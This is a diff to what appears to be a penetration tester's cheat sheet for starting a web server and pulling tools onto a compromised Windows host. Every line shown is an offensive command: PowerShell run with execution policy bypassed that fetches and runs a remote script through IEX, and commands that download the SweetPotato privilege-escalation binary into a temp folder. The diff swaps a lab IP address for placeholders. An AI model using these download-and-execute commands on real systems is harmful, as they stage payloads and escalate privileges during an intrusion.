@@ -1,10 +1,10 @@
 ## Start up WebServer
 
 #Run on remote machine to download scripts from server
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>/helloworld.ps1'))
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/helloworld.ps1'))
 
 #Run on remote machine to download scripts from server
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadFile('http://192.168.119.202/SweetPotato.exe', "C:\Windows\temp\sp.exe"))
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/SweetPotato.exe', 'C:<LOCATION>\sp.exe')
 
 #If already in PowerShell to grabfile
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.202/SweetPotato.exe', "C:\Windows\temp\sp2.exe")
+(New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/SweetPotato.exe', 'C:<LOCATION>\sp2.exe')
